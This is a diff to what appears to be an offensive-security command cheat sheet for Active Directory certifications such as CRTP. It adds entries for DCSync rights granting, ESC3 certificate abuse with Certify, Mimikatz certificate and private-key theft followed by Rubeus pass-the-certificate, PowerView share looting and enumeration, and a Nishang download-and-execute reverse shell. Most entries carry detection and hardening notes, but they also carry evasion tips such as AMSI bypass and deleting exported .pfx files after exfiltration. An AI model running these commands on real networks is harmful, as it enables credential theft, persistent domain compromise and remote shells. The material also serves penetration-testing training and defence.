@@ -425,6 +425,10 @@ const COMMAND_DATA = {
         {
           "label": "Grant via RACE Set-ADACL",
           "command": "Set-ADACL -SamAccountName <user> -DistinguishedName '<object_dn>' -Right DCSync -Verbose"
+        },
+        {
+          "label": "Set-DCPermissions (grant replication/DCSync rights)",
+          "command": "Set-DCPermissions -Method acl -DistinguishedName 'dc=<domain>,dc=local' -User '<user>' -Verbose"
         }
       ]
     },
@@ -1241,6 +1245,14 @@ const COMMAND_DATA = {
         {
           "label": "Enroll as Administrator",
           "command": "Certify.exe request /ca:CA01.corp.local\\corp-CA01 /template:User /onbehalfof:corp\\Administrator /enrollcert:ea.pfx /enrollcertpw:Password123"
+        },
+        {
+          "label": "ESC3 - request enrollment-agent cert (lab template)",
+          "command": "Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent"
+        },
+        {
+          "label": "ESC3 - enroll on behalf of DA (lab template)",
+          "command": "Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123"
         }
       ],
       "recommended": [
@@ -42911,6 +42923,139 @@ const COMMAND_DATA = {
       "type": "command"
     },
     {
+      "id": "crtp-mimikatz-cert-export",
+      "name": "Mimikatz Certificate Theft (crypto::capi / crypto::cng)",
+      "command": "Invoke-Mimikatz -Command '\"crypto::capi\" \"crypto::cng\" \"crypto::certificates /export\"'",
+      "description": "Steal certificates AND their private keys from the current user and the local machine stores - even when the private key is marked non-exportable. crypto::capi patches CryptoAPI and crypto::cng patches the KeyIso (CNG) service in memory so that crypto::certificates /export can dump every certificate (with key) to PFX. Stolen client-auth certs enable PKINIT/Pass-the-Certificate authentication and long-lived persistence (valid until the cert expires, surviving password resets).",
+      "platform": "windows",
+      "category": "Active Directory",
+      "subcategory": "Domain Persistence",
+      "type": "command",
+      "certifications": [
+        "CRTP"
+      ],
+      "source": "CRTP",
+      "opsec": "loud",
+      "mitre": [
+        "T1649",
+        "T1552.004"
+      ],
+      "tools": [
+        "Mimikatz",
+        "SafetyKatz"
+      ],
+      "tags": [
+        "adcs",
+        "certificates",
+        "theft",
+        "mimikatz",
+        "pkinit",
+        "persistence",
+        "crypto"
+      ],
+      "steps": [
+        {
+          "label": "Patch CryptoAPI so CAPI keys become exportable",
+          "command": "Invoke-Mimikatz -Command '\"crypto::capi\"'"
+        },
+        {
+          "label": "Patch KeyIso (CNG) so CNG keys become exportable",
+          "command": "Invoke-Mimikatz -Command '\"crypto::cng\"'"
+        },
+        {
+          "label": "Export certs+keys from the CURRENT USER store",
+          "command": "Invoke-Mimikatz -Command '\"crypto::certificates /export\"'"
+        },
+        {
+          "label": "Export certs+keys from the LOCAL MACHINE store",
+          "command": "Invoke-Mimikatz -Command '\"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE\"'"
+        },
+        {
+          "label": "Authenticate with a stolen client-auth cert (PKINIT)",
+          "command": "Rubeus.exe asktgt /user:<user> /certificate:<stolen>.pfx /password:mimikatz /ptt"
+        }
+      ],
+      "variations": [
+        {
+          "label": "One-shot: patch both providers + export both stores",
+          "command": "Invoke-Mimikatz -Command '\"crypto::capi\" \"crypto::cng\" \"crypto::certificates /export\" \"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE\"'"
+        },
+        {
+          "label": "Native mimikatz.exe (via Loader, in-memory)",
+          "command": "Loader.exe -path C:\\AD\\Tools\\mimikatz.exe -args crypto::capi crypto::cng \"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE\" exit"
+        },
+        {
+          "label": "List certificates before exporting",
+          "command": "Invoke-Mimikatz -Command '\"crypto::certificates\"'"
+        }
+      ],
+      "examples": [
+        {
+          "label": "Dump machine-store certs (default password on PFX = mimikatz)",
+          "command": "Invoke-Mimikatz -Command '\"crypto::capi\" \"crypto::cng\" \"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE\"'"
+        },
+        {
+          "label": "Use exported cert for a DA TGT",
+          "command": "Rubeus.exe asktgt /user:administrator /certificate:C:\\AD\\Tools\\stolen-DA.pfx /password:mimikatz /ptt"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-invishell",
+          "note": "Bypass AMSI/logging before running Mimikatz",
+          "rel": "prereq"
+        },
+        {
+          "id": "crtp-adcs-esc1",
+          "note": "Alternative: request a forged cert via ESC1 instead of stealing one",
+          "rel": "alternative"
+        },
+        {
+          "id": "crtp-overpass-hash",
+          "note": "Use the cert/TGT for lateral movement",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-credential-dumping",
+          "note": "Also dump LSASS creds while on the host",
+          "rel": "next"
+        }
+      ],
+      "notes": "Exported PFX files are protected with the default password 'mimikatz' unless changed. Machine-store export requires local admin/SYSTEM; current-user export runs in the user's context. Certificate-based persistence is powerful: a stolen client-auth certificate keeps working after the account's password is reset, until the certificate expires or is revoked. This is the THEFT1/THEFT4 path from the Certified Pre-Owned research. Run under InviShell / after an AMSI bypass - Invoke-Mimikatz is heavily signatured.",
+      "references": [
+        {
+          "title": "CRTP - Domain Persistence / AD CS",
+          "url": "https://www.alteredsecurity.com/adlab"
+        },
+        {
+          "title": "SpecterOps - Certified Pre-Owned (THEFT techniques)",
+          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+        },
+        {
+          "title": "MITRE T1649 - Steal or Forge Authentication Certificates",
+          "url": "https://attack.mitre.org/techniques/T1649/"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Windows lets you flag a private key 'non-exportable', but that flag is enforced only in user mode by CryptoAPI/CNG. With local admin, Mimikatz patches those providers (crypto::capi / crypto::cng) in memory so the export path succeeds anyway, then exports every certificate with its private key. AD authentication certificates are as good as a password hash - and last until expiry.",
+        "prerequisites": "Local admin (current-user store) or SYSTEM (machine store) on the host holding the certificate. Mimikatz/SafetyKatz. A code-execution primitive plus AMSI/logging bypass to run it cleanly.",
+        "impact": "T1649 steal authentication certificates + T1552.004 private keys. Stolen client-auth certs enable PKINIT/Pass-the-Certificate as the cert's subject (often a privileged user or the machine account), and provide password-reset-surviving persistence.",
+        "misconfiguration": "Certificates issued with 'private key exportable' where unnecessary; privileged client-auth certs stored on general-purpose hosts; no monitoring of certificate export / Mimikatz execution; local admin over-provisioned.",
+        "vulnerable_config": "# Cert present in LocalMachine\\My with a client-auth EKU and a usable private key:\nGet-ChildItem Cert:\\LocalMachine\\My | ? { $_.HasPrivateKey } | select Subject,NotAfter,EnhancedKeyUsageList\n# Attacker with admin patches CAPI/CNG -> exports it regardless of the non-exportable flag",
+        "secure_config": "# Store keys in a TPM/HSM-backed KSP so they cannot be exported even by admin:\n#  - Issue certs with a hardware KSP (e.g. 'Microsoft Platform Crypto Provider')\n#  - Enrollment: 'Key Storage Provider' + require TPM; do NOT mark keys exportable\n# Reduce local admin footprint; put privileged certs only on hardened, tiered hosts.\n# CA hygiene: short validity, enable revocation (CRL/OCSP), monitor issuance.",
+        "detection": "Mimikatz on host: Event 4104 (crypto::certificates / crypto::capi / crypto::cng) if SBL enabled; Sysmon 10 (process access to lsass/keyiso) and Sysmon 7 (Mimikatz module loads). Certificate export events (CAPI2 Operational log Event 70/1001) and creation of unexpected .pfx files. MDE 'Certificate exported' / 'Mimikatz' analytics. Follow-on: 4768/4769 PKINIT logons from unusual hosts.",
+        "artifacts": "CAPI2 Operational Event 70 (private key export) | new .pfx files on disk | Event 4104 crypto:: commands | Sysmon 10 lsass/keyiso access | subsequent PKINIT 4768 (pre-auth type 16)",
+        "prevention": "Use non-exportable, TPM/HSM-backed keys (hardware KSP). Enforce tiered admin so attackers can't get admin on hosts holding privileged certs. Enable Script Block Logging + Sysmon. Enable certificate revocation and monitor CA issuance. Rotate/revoke certs on compromise (password reset alone is not enough).",
+        "evasion": "Run in-memory via Loader.exe/SafetyKatz to avoid on-disk AV; bypass AMSI + disable Script Block Logging first (InviShell); export to a non-obvious path; clear the .pfx after exfil.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1649/",
+          "https://attack.mitre.org/techniques/T1552/004/",
+          "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+          "CRTP Domain Persistence"
+        ]
+      }
+    },
+    {
       "id": "mimikatz-lsadump",
       "name": "Mimikatz LSA Dump (SAM / LSA Secrets)",
       "command": "lsadump::sam",
@@ -55305,6 +55450,259 @@ const COMMAND_DATA = {
       ]
     },
     {
+      "id": "crtp-powerview-file-hunting",
+      "name": "PowerView Interesting File & Share ACL Hunting",
+      "command": "Find-InterestingDomainShareFile -Include *pass*,*.config,*.xml,*.vbs,*.ps1",
+      "description": "Search readable domain shares for files whose names match sensitive patterns (passwords, configs, scripts, keys) and inspect the ACLs on file paths. The PowerView-native equivalent of Snaffler - finds credentials and secrets sitting on shares without dropping a tool on disk.",
+      "platform": "windows",
+      "category": "Active Directory",
+      "subcategory": "Domain Enumeration",
+      "type": "command",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "source": "CRTP",
+      "opsec": "loud",
+      "mitre": [
+        "T1083",
+        "T1135",
+        "T1039",
+        "T1552.001"
+      ],
+      "tools": [
+        "PowerView"
+      ],
+      "tags": [
+        "file-hunting",
+        "shares",
+        "credentials",
+        "powerview",
+        "snaffler",
+        "looting"
+      ],
+      "variations": [
+        {
+          "label": "Search a specific path for interesting files",
+          "command": "Find-InterestingFile -Path \\\\<host>\\<share>\\ -Include *.txt,*.xml,*.config,*.kdbx"
+        },
+        {
+          "label": "ACLs on a filesystem path (SYSVOL / share perms)",
+          "command": "Get-PathAcl -Path \\\\<dc>\\sysvol"
+        },
+        {
+          "label": "Find reachable domain shares first",
+          "command": "Find-DomainShare -CheckShareAccess"
+        },
+        {
+          "label": "Interesting files, last-accessed filter",
+          "command": "Find-InterestingDomainShareFile -Include *cred*,*.ps1 -LastAccessTime (Get-Date).AddDays(-30)"
+        }
+      ],
+      "examples": [
+        {
+          "label": "Hunt password/config files across all readable shares",
+          "command": "Find-InterestingDomainShareFile -Include *pass*,*.config,unattend.xml,web.config | select Path,Name"
+        },
+        {
+          "label": "Check who can read a sensitive share path",
+          "command": "Get-PathAcl -Path \\\\dcorp-dc\\sysvol | select IdentityReference,FileSystemRights"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Enumerate reachable shares",
+          "command": "Find-DomainShare -CheckShareAccess"
+        },
+        {
+          "label": "Hunt interesting files on those shares",
+          "command": "Find-InterestingDomainShareFile -Include *pass*,*.config,*.xml,*.ps1"
+        },
+        {
+          "label": "Inspect ACLs on a promising path",
+          "command": "Get-PathAcl -Path \\\\<host>\\<share>"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-session-share-hunting",
+          "note": "Enumerate shares/sessions before file hunting",
+          "rel": "prereq"
+        },
+        {
+          "id": "crtp-powerview-users-groups",
+          "note": "Pivot on credentials found in files",
+          "rel": "next"
+        },
+        {
+          "id": "ad-snaffler",
+          "note": "Snaffler - faster automated equivalent",
+          "rel": "alternative"
+        }
+      ],
+      "notes": "Find-InterestingFile / Find-InterestingDomainShareFile need read access to the target path; full coverage of admin-only shares (C$, ADMIN$) requires local admin. Get-PathAcl needs local admin only when reading ACLs on a remote machine's filesystem. Common finds: unattend.xml, web.config, sysprep.inf, .kdbx, .ps1 scripts with hardcoded creds, Groups.xml (GPP cpassword).",
+      "references": [
+        {
+          "title": "CRTP - Domain Enumeration",
+          "url": "https://www.alteredsecurity.com/adlab"
+        },
+        {
+          "title": "PowerSploit/PowerView - Recon",
+          "url": "https://powersploit.readthedocs.io/en/latest/Recon/"
+        },
+        {
+          "title": "MITRE T1135 - Network Share Discovery",
+          "url": "https://attack.mitre.org/techniques/T1135/"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Any authenticated user can enumerate shares and read files their ACLs permit. Organisations routinely leave credentials, config files, and scripts on shares readable by 'Authenticated Users' or 'Domain Users', so a domain account is enough to loot secrets.",
+        "prerequisites": "Any valid domain account. SMB (445) to file servers. Read access on the target shares (local admin only for admin$ shares).",
+        "impact": "T1083/T1135/T1039 discovery + T1552.001 credentials in files. Plaintext or reversible credentials recovered from shares frequently yield privileged accounts and immediate escalation.",
+        "misconfiguration": "Over-permissive share/NTFS ACLs (Authenticated Users: Read). Credentials stored in cleartext in scripts/configs on shares. GPP cpassword left in SYSVOL. No file-access auditing.",
+        "vulnerable_config": "# Share readable by all domain users, contains creds:\n# \\\\fileserver\\IT\\scripts\\deploy.ps1  ->  $pass = 'P@ssw0rd123'\n# ACL: BUILTIN\\Users Allow Read",
+        "secure_config": "# Restrict share ACLs to least privilege:\nGet-SmbShareAccess -Name 'IT'\nRevoke-SmbShareAccess -Name 'IT' -AccountName 'Authenticated Users' -Force\nGrant-SmbShareAccess -Name 'IT' -AccountName 'CORP\\IT-Staff' -AccessRight Read -Force\n# Remove secrets from shares; use a vault (LAPS/gMSA/CyberArk). Purge GPP cpassword (KB2962486).",
+        "detection": "Mass SMB reads / directory enumeration across many shares from one host (Sysmon 3 + Windows 5140/5145 share-access auditing). MDI 'Data exfiltration/enumeration' analytics. Honeyfiles with named-pipe/canary alerts on access.",
+        "artifacts": "Event 5140/5145 (network share access) bursts | Sysmon 3 to 445 many hosts | Access to canary/honeyfiles",
+        "prevention": "Least-privilege share ACLs; remove cleartext secrets from shares; deploy LAPS/gMSA; enable object-access auditing (5145); deploy honeyfiles; purge GPP cpassword.",
+        "evasion": "Target a curated host/share list instead of the whole domain; filter by extension to reduce reads; run during business hours to blend with normal file activity.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1135/",
+          "https://attack.mitre.org/techniques/T1552/001/",
+          "CRTP Domain Enumeration"
+        ]
+      }
+    },
+    {
+      "id": "crtp-powerview-sites-subnets",
+      "name": "PowerView Sites, Subnets & AD Topology Enumeration",
+      "command": "Get-DomainSite | select name,siteobjectbl",
+      "description": "Map the physical/logical layout of the forest: AD Sites, their Subnets, Global Catalog servers, and which site a given host lives in. Reveals network segmentation and where high-value infrastructure (DCs, GCs, file servers) sits - used to plan lateral movement and locate targets by network location.",
+      "platform": "windows",
+      "category": "Active Directory",
+      "subcategory": "Domain Enumeration",
+      "type": "command",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "source": "CRTP",
+      "opsec": "moderate",
+      "mitre": [
+        "T1016",
+        "T1018",
+        "T1087.002"
+      ],
+      "tools": [
+        "PowerView"
+      ],
+      "tags": [
+        "sites",
+        "subnets",
+        "topology",
+        "powerview",
+        "recon",
+        "globalcatalog"
+      ],
+      "variations": [
+        {
+          "label": "All subnets (mapped to sites)",
+          "command": "Get-DomainSubnet | select name,site"
+        },
+        {
+          "label": "Site of a specific host",
+          "command": "Get-NetComputerSiteName -ComputerName <host>"
+        },
+        {
+          "label": "Global Catalog servers in the forest",
+          "command": "Get-ForestGlobalCatalog"
+        },
+        {
+          "label": "Domain controllers",
+          "command": "Get-DomainController | select Name,IPAddress,OSVersion"
+        },
+        {
+          "label": "Forest + child domains",
+          "command": "Get-ForestDomain"
+        }
+      ],
+      "examples": [
+        {
+          "label": "List sites with linked subnets",
+          "command": "Get-DomainSite -Properties name,siteobjectbl | fl"
+        },
+        {
+          "label": "Find which site a server is in",
+          "command": "Get-NetComputerSiteName -ComputerName dcorp-mssql.dollarcorp.moneycorp.local"
+        },
+        {
+          "label": "Enumerate subnets to map network ranges",
+          "command": "Get-DomainSubnet | select name,siteobject | sort name"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Enumerate all AD sites",
+          "command": "Get-DomainSite | select name,siteobjectbl"
+        },
+        {
+          "label": "Enumerate subnets and their site mapping",
+          "command": "Get-DomainSubnet | select name,site"
+        },
+        {
+          "label": "Resolve a target host to its site",
+          "command": "Get-NetComputerSiteName -ComputerName <host>"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-powerview-domain",
+          "note": "Broader domain/forest object enumeration",
+          "rel": "prereq"
+        },
+        {
+          "id": "crtp-session-share-hunting",
+          "note": "Hunt sessions/shares on hosts found by site",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-powerview-userhunting",
+          "note": "Locate privileged users on the mapped hosts",
+          "rel": "next"
+        }
+      ],
+      "notes": "AD Sites/Subnets are readable by any authenticated user via LDAP. Useful to (a) understand segmentation before pivoting, (b) find the closest DC/GC, and (c) locate file servers by subnet. PowerView helper functions live alongside these: ConvertFrom-UACValue (decode userAccountControl flags), ConvertTo-SID / Convert-ADName (name<->SID<->format), Resolve-IPAddress (host->IP), Export-PowerViewCSV (thread-safe CSV output). These are utilities used with the enumeration cmdlets, not attacks in themselves.",
+      "references": [
+        {
+          "title": "CRTP - Domain Enumeration",
+          "url": "https://www.alteredsecurity.com/adlab"
+        },
+        {
+          "title": "PowerSploit/PowerView - Recon",
+          "url": "https://powersploit.readthedocs.io/en/latest/Recon/"
+        },
+        {
+          "title": "MITRE T1016 - System Network Configuration Discovery",
+          "url": "https://attack.mitre.org/techniques/T1016/"
+        }
+      ],
+      "defense": {
+        "why_it_works": "AD Sites, Subnets, and Global Catalog objects live in the Configuration naming context and are world-readable to any authenticated principal by design (clients need them to find their nearest DC). PowerView queries them over LDAP - no special rights required.",
+        "prerequisites": "Any valid domain account. LDAP (389/636) reachability to a DC. PowerView loaded in the session.",
+        "impact": "T1016 / T1018 network + system discovery. Gives the attacker a map of the physical network layout, DC/GC placement, and subnet ranges - turning blind lateral movement into targeted movement toward high-value segments.",
+        "misconfiguration": "None required - this is default AD behaviour. The exposure is inherent to the Configuration partition being readable by authenticated users.",
+        "detection": "High LDAP query volume against the Configuration NC (CN=Sites, CN=Subnets) from a non-DC host. Event 1644 (LDAP query logging, if enabled) showing searches for site/subnet/nTDSDSA objects. MDE/MDI reconnaissance analytics: bursts of Configuration-partition reads from a workstation.",
+        "artifacts": "DC LDAP logs (Event 1644) with searchBase = CN=Configuration | Sysmon Event 3 to 389/636 | Directory Service query bursts",
+        "prevention": "Cannot be prevented without breaking AD - these objects must be readable for clients to function. Focus on detection (LDAP query auditing, MDI) and on limiting what an attacker gains: strong segmentation, tiered admin, and monitoring the follow-on lateral movement.",
+        "evasion": "Query a single object at a time; use the AD PowerShell module (ActiveDirectory\\Get-ADReplicationSite) which blends in with admin tooling better than PowerView; throttle queries.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1016/",
+          "https://attack.mitre.org/techniques/T1018/",
+          "CRTP Domain Enumeration"
+        ]
+      }
+    },
+    {
       "id": "crtp-powerview-trusts",
       "name": "PowerView Trust Enumeration",
       "command": "Get-DomainTrust | select SourceName,TargetName,TrustDirection,TrustType",
@@ -55494,7 +55892,41 @@ const COMMAND_DATA = {
         "misconfiguration": "NetSessionEnum accessible to all authenticated users (default). DAs log on to regular workstations for daily tasks. No Credential Guard. No PAW model.",
         "vulnerable_config": "# RestrictRemoteSam not configured (default):\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa').RestrictRemoteSam\n# Returns $null = not restricted = any auth user can enumerate sessions\n\n# DA logged onto workstation WS01:\n# NetSessionEnum returns: CORP\\DomainAdmin1 → WS01 → target for token theft",
         "secure_config": "# Restrict NetSessionEnum:\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RestrictRemoteSam -Value 'O:BAG:BAD:(A;;RC;;;BA)'\n\n# PAW model + Authentication Policy Silos:\nNew-ADAuthenticationPolicySilo -Name 'DomainAdmin-Silo'\n# Restrict DA logon to PAW computers only\n\n# Protected Users group:\nAdd-ADGroupMember -Identity 'Protected Users' -Members 'DomainAdmin1'\n# No NTLM, no delegatable credentials, no cached creds on logon"
-      }
+      },
+      "variations": [
+        {
+          "label": "Get-NetLoggedon (logged-on users on a host)",
+          "command": "Get-NetLoggedon -ComputerName <host>"
+        },
+        {
+          "label": "Get-NetSession (active sessions on a host)",
+          "command": "Get-NetSession -ComputerName <host>"
+        },
+        {
+          "label": "Get-NetRDPSession (RDP sessions on a host)",
+          "command": "Get-NetRDPSession -ComputerName <host>"
+        },
+        {
+          "label": "Get-RegLoggedOn (logged-on via remote registry)",
+          "command": "Get-RegLoggedOn -ComputerName <host>"
+        },
+        {
+          "label": "Find-DomainProcess (hunt a process domain-wide)",
+          "command": "Find-DomainProcess -ProcessName <proc>"
+        },
+        {
+          "label": "Find-DomainUserEvent (logon events for a user)",
+          "command": "Find-DomainUserEvent -UserIdentity <user>"
+        },
+        {
+          "label": "Get-DomainUserEvent (4624 logon events on a host)",
+          "command": "Get-DomainUserEvent -ComputerName <host>"
+        },
+        {
+          "label": "Find-DomainLocalGroupMember (local group members domain-wide)",
+          "command": "Find-DomainLocalGroupMember -GroupName Administrators"
+        }
+      ]
     },
     {
       "id": "crtp-powerview-users-groups",
@@ -55606,7 +56038,29 @@ const COMMAND_DATA = {
         "misconfiguration": "Service accounts with SPNs have stale passwords (Kerberoastable). Accounts have DoesNotRequirePreAuth set. Nested group memberships not audited — hidden DA pathways.",
         "vulnerable_config": "# Service accounts with old SPN passwords:\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet\n# PasswordLastSet: 2015-01-01 — crackable Kerberos ticket\n\n# AS-REP roastable accounts:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true}",
         "secure_config": "# Use gMSA for service accounts (auto-rotate passwords):\nNew-ADServiceAccount -Name 'svc_web' -DNSHostName 'dc01.corp.local' -ManagedPasswordIntervalInDays 30\n\n# Ensure pre-auth required:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Set-ADAccountControl -DoesNotRequirePreAuth $false\n\n# Alert on SPN enumeration:\n# SIEM: Event 4769 volume spike from unexpected source"
-      }
+      },
+      "variations": [
+        {
+          "label": "Get-DomainManagedSecurityGroup (managed-by set)",
+          "command": "Get-DomainManagedSecurityGroup"
+        },
+        {
+          "label": "Get-DomainForeignUser (users in foreign-domain groups)",
+          "command": "Get-DomainForeignUser"
+        },
+        {
+          "label": "New-DomainUser (create user - needs delegated rights)",
+          "command": "New-DomainUser -SamAccountName <user> -AccountPassword (ConvertTo-SecureString '<pass>' -AsPlainText -Force)"
+        },
+        {
+          "label": "New-DomainGroup (create group - needs delegated rights)",
+          "command": "New-DomainGroup -SamAccountName <group>"
+        },
+        {
+          "label": "Set-DomainUserPassword (reset - needs Reset-Password right)",
+          "command": "Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString '<pass>' -AsPlainText -Force)"
+        }
+      ]
     },
     {
       "id": "pre-engagement-docs",
@@ -61806,6 +62260,10 @@ const COMMAND_DATA = {
         {
           "label": "Windows Nishang Invoke-PowerShellTcp (download + exec)",
           "command": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <lhost> -Port <lport>\""
+        },
+        {
+          "label": "Windows Nishang Invoke-PowerShellTcpEx (AES-encrypted)",
+          "command": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/Invoke-PowerShellTcpEx.ps1');Invoke-PowerShellTcpEx -Reverse -IPAddress <lhost> -Port <lport>\""
         }
       ],
       "opsec": "loud",
@@ -64385,6 +64843,10 @@ const COMMAND_DATA = {
         {
           "label": "PowerView DFS shares",
           "command": "Get-DomainDFSShare"
+        },
+        {
+          "label": "Get-NetShare (shares on a specific host)",
+          "command": "Get-NetShare -ComputerName <host>"
         }
       ],
       "steps": [
@@ -89984,8 +90446,8 @@ const COMMAND_DATA = {
       ]
     }
   ],
-  "totalCommands": 905,
-  "buildDate": "2026-08-31T12:29:49.353Z",
+  "totalCommands": 908,
+  "buildDate": "2026-09-02T03:51:31.214Z",
   "certifications": [
     "CDSA",
     "CPTS",
